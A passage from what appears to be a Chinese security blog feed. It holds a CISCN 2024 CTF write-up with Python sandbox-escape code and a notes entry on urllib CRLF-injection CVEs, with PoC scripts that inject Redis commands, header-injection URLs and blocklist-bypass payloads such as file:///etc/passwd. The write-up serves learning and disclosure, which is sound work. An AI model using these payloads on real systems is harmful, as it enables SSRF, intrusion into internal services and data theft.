src="/blog/2024/05/18/CISCN2024/image-20240520143659471.png" alt="image-20240520143659471"></p><p>打印一下里面的常量<code>co_consts</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    glo <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"builtins"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>    <span class="token builtin">dir</span> <span class="token operator">=</span> glo<span class="token punctuation">.</span><span class="token builtin">dir</span>    getflag <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_code    <span class="token keyword">for</span> i <span class="token keyword">in</span> getflag<span class="token punctuation">.</span>co_consts<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240520143852477.png" alt="image-20240520143852477"></p><p>这里被最后的<code>THIS_IS_SEED</code>检测给拦住了，用<code>str</code>方法转成字符串就可以打了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    glo <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"builtins"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>    <span class="token builtin">dir</span> <span class="token operator">=</span> glo<span class="token punctuation">.</span><span class="token builtin">dir</span>    <span class="token builtin">str</span> <span class="token operator">=</span> glo<span class="token punctuation">.</span><span class="token builtin">str</span>    getflag <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_code    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>getflag<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240520144412328.png" alt="image-20240520144412328"></p><hr><h2 id="ezjava-Unsolved"><a href="#ezjava-Unsolved" class="headerlink" title="ezjava (Unsolved)"></a>ezjava (Unsolved)</h2><blockquote><p>CVE-2023-32697</p></blockquote><p>jdbc打数据库，给了mysql，psql和sqlite三个数据库接口，但是我不会jdbc</p><p>看一下依赖：mysql-connector-java-8.0.13.jar</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;唉唉，某种意义上web爆0了，&lt;del&gt;“你们怎么不做web啊，是不想做吗”&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;simple_php是队友点出来的，cms是头天晚上突然审明白才会的&lt;/p&gt;
&lt;p&gt;两道python是有大概思路但是不会做的&lt;/p&gt;
&lt;p&gt;jdbc是没学的。。。&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/Jayjay___/article/details/139047540&quot;&gt;https://blog.csdn.net/Jayjay___/article/details/139047540&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://jbnrz.com.cn/index.php/2024/05/20/ciscn-2024/&quot;&gt;https://jbnrz.com.cn/index.php/2024/05/20/ciscn-2024/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/gxngxngxn/p/18205235&quot;&gt;https://www.cnblogs.com/gxngxngxn/p/18205235&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/&quot;&gt;https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jackacc.com/uncategorized/ciscn-2024-web-writeups/&quot;&gt;https://www.jackacc.com/uncategorized/ciscn-2024-web-writeups/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://124.221.19.214/archives/681/#cl-3&quot;&gt;http://124.221.19.214/archives/681/#cl-3&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="CMS" scheme="http://c1oudfl0w0.github.io/blog/tags/CMS/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="python" scheme="http://c1oudfl0w0.github.io/blog/tags/python/"/>
    
    <category term="沙箱逃逸" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>Python urllib CRLF注入漏洞</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/05/11/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/05/11/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-05-11T08:26:32.000Z</published>
    <updated>2024-05-11T09:16:02.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="http://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93">http://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93</a></p><span id="more"></span><hr><h1 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h1><p>这个已经品鉴够多了，快点端下去吧，总之就是利用 回车+换行（<code>\r\n</code>）注入自己的http请求体</p><hr><h1 id="CVE-2016-5699"><a href="#CVE-2016-5699" class="headerlink" title="CVE-2016-5699"></a>CVE-2016-5699</h1><p>版本：urllib2 and urllib in CPython (aka Python) before <strong>2.7.10</strong> and 3.x before <strong>3.4.4</strong></p><p>注入点：<strong>IP地址和端口号的分隔符</strong>即<code>:</code>前面</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>正常报文：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/foo</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.4</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:12345</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注入后的报文：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/foo</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.4</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-injected</span><span class="token punctuation">:</span> <span class="token header-value">header</span></span><span class="token header"><span class="token header-name keyword">x-leftover</span><span class="token punctuation">:</span> <span class="token header-value">:12345</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如<code>%00</code>，这样才能顺利地进行DNS查询，如<code>http://localhost%00%0d%0ax-bar:%20:12345/foo</code></p><hr><h1 id="CVE-2019-9740"><a href="#CVE-2019-9740" class="headerlink" title="CVE-2019-9740"></a>CVE-2019-9740</h1><p>版本：urllib2 in Python 2.x through <strong>2.7.16</strong> and urllib in Python 3.x through <strong>3.7.3</strong></p><p>注入点：<strong>IP地址和端口号的分隔符</strong>即<code>:</code>前面，但是和前者的区别在于注入新的端口</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//10.10.10.10:1234?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>poc：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> urllib<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>error<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesthost <span class="token operator">=</span> <span class="token string">"192.168.10.137:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"</span>redis_att <span class="token operator">=</span> <span class="token string">'192.168.10.137:6379?\r\nSET hacker\r\n'</span><span class="token comment"># 打redis</span>url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> redis_att <span class="token operator">+</span> <span class="token string">":8080/test/?test=a"</span><span class="token keyword">try</span><span class="token punctuation">:</span>    info <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注入后的报文：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?a=1</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">X-injected</span><span class="token punctuation">:</span> <span class="token header-value">header</span></span><span class="token header"><span class="token header-name keyword">TEST</span><span class="token punctuation">:</span> <span class="token header-value">123:8080/test/?test=a HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.10.137:7777</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.6</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="CVE-2019-9947"><a href="#CVE-2019-9947" class="headerlink" title="CVE-2019-9947"></a>CVE-2019-9947</h1><p>版本：urllib2 in Python 2.x through <strong>2.7.16</strong> and urllib in Python 3.x through <strong>3.7.3</strong></p><p>注入点：在端口号后面</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//10.10.10.10:8080/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//10.10.10.10:8080/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>poc：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://192.168.10.137:7777/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n'</span><span class="token punctuation">)</span><span class="token comment"># urllib.request.urlopen('http://192.168.10.137:7777/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n')</span><span class="token comment"># 打内网redis</span><span class="token comment"># urllib.request.urlopen('http://192.168.10.137:6379/?q=HTTP/1.1\r\nSET VULN POC\r\nHeader2:\r\n')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注入报文：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /?q=HTTP/1.1<span class="token header"><span class="token header-name keyword">Header</span><span class="token punctuation">:</span> <span class="token header-value">Value</span></span><span class="token header"><span class="token header-name keyword">Header2</span><span class="token punctuation">:</span> <span class="token header-value">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.10.137:7777</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.6</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /HTTP/1.1<span class="token header"><span class="token header-name keyword">Header</span><span class="token punctuation">:</span> <span class="token header-value">Value</span></span><span class="token header"><span class="token header-name keyword">Header2</span><span class="token punctuation">:</span> <span class="token header-value">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.10.137:7777</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.6</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="CVE-2023-24329"><a href="#CVE-2023-24329" class="headerlink" title="CVE-2023-24329"></a>CVE-2023-24329</h1><p>版本：Python &lt; 3.12，Python 3.11.x &lt; 3.11.4，Python 3.10.x &lt; 3.10.12，Python 3.9.x &lt; 3.9.17，Python 3.8.x &lt; 3.8.17，Python 3.7.x &lt; 3.7.17</p><p>描述：Python多个受影响版本中，当整个URL以<strong>空白字符</strong>开头时，<code>urllib.parse</code>会出现解析问题（影响主机名和方案的解析），可以通过提供以空白字符开头的URL来绕过使用阻止列表实现的任何域或协议过滤方法</p><p>poc：<a href="https://github.com/H4R335HR/CVE-2023-24329-PoC/tree/main">https://github.com/H4R335HR/CVE-2023-24329-PoC/tree/main</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token comment"># ANSI color codes</span>GREEN <span class="token operator">=</span> <span class="token string">'\033[92m'</span>RED <span class="token operator">=</span> <span class="token string">'\033[91m'</span>ENDC <span class="token operator">=</span> <span class="token string">'\033[0m'</span>explanation <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    In this application, we have blocked certain URL schemes and hostnames by checking urlparse(input_link).scheme and urlparse(input_link).hostname with the following list:        block_schemes = ["file", "gopher", "expect", "php", "dict", "ftp", "glob", "data"]    block_host = ["instagram.com", "youtube.com", "tiktok.com"]        Due to a flaw in how the urlparse splits the URL, you can bypass this blocklist by simply adding a leading space in the URL. Below are some URLs for you to try. Try them with and without leading spaces:        https://youtube.com    file://127.0.0.1/etc/passwd    data://text/plain, &lt;?php phpinfo() ?>    expect://whoami        Based on research by Yebo Cao - https://pointernull.com/security/python-url-parse-problem.html        Your Python version is &#123;&#125;.    '''</span><span class="token keyword">def</span> <span class="token function">is_vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    python_version <span class="token operator">=</span> sys<span class="token punctuation">.</span>version_info        <span class="token keyword">if</span> python_version <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> python_version <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">safe_url_opener</span><span class="token punctuation">(</span>input_link<span class="token punctuation">)</span><span class="token punctuation">:</span>    block_schemes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">,</span> <span class="token string">"gopher"</span><span class="token punctuation">,</span> <span class="token string">"expect"</span><span class="token punctuation">,</span> <span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"dict"</span><span class="token punctuation">,</span> <span class="token string">"ftp"</span><span class="token punctuation">,</span> <span class="token string">"glob"</span><span class="token punctuation">,</span> <span class="token string">"data"</span><span class="token punctuation">]</span>    block_host <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"instagram.com"</span><span class="token punctuation">,</span> <span class="token string">"youtube.com"</span><span class="token punctuation">,</span> <span class="token string">"tiktok.com"</span><span class="token punctuation">]</span>    input_scheme <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>input_link<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Input scheme is"</span><span class="token punctuation">,</span> input_scheme<span class="token punctuation">)</span>    input_hostname <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>input_link<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Input hostname is"</span><span class="token punctuation">,</span> input_hostname<span class="token punctuation">)</span>    <span class="token keyword">if</span> input_scheme <span class="token keyword">in</span> block_schemes<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">"Input scheme is forbidden"</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">if</span> input_hostname <span class="token keyword">in</span> block_host<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">"Input hostname is forbidden"</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        target <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>input_link<span class="token punctuation">)</span>        content <span class="token operator">=</span> target<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error:"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    python_version <span class="token operator">=</span> sys<span class="token punctuation">.</span>version    vuln_status <span class="token operator">=</span> RED<span class="token operator">+</span><span class="token string">"vulnerable"</span><span class="token operator">+</span>ENDC <span class="token keyword">if</span> is_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> GREEN<span class="token operator">+</span><span class="token string">"not vulnerable"</span><span class="token operator">+</span>ENDC    <span class="token keyword">print</span><span class="token punctuation">(</span>explanation<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vuln_status<span class="token punctuation">)</span><span class="token punctuation">)</span>        num_links <span class="token operator">=</span> <span class="token number">4</span>  <span class="token comment"># Number of times to repeat</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_links<span class="token punctuation">)</span><span class="token punctuation">:</span>        input_link <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter the link: "</span><span class="token punctuation">)</span>        safe_url_opener<span class="token punctuation">(</span>input_link<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：<a href="https://github.com/JawadPy/CVE-2023-24329-Exploit/tree/main">https://github.com/JawadPy/CVE-2023-24329-Exploit/tree/main</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Python version: before 3.11.4</span><span class="token comment"># CVE-2023-24329</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parseblocked_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"http://example.com/"</span><span class="token punctuation">,</span>    <span class="token string">"http://example2.com/"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">is_url_blocked</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    parse <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>geturl<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span>  parse <span class="token keyword">in</span> blocked_list<span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'URL Blocked'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'Bypassed'</span> payload1 <span class="token operator">=</span> <span class="token string">"    http://example.com/"</span>payload2 <span class="token operator">=</span> <span class="token string">"http://example.com/"</span><span class="token keyword">print</span><span class="token punctuation">(</span>    is_url_blocked<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"\n"</span><span class="token punctuation">,</span>    is_url_blocked<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/106">https://security.tencent.com/index.php/blog/msg/106</a></p><hr><h2 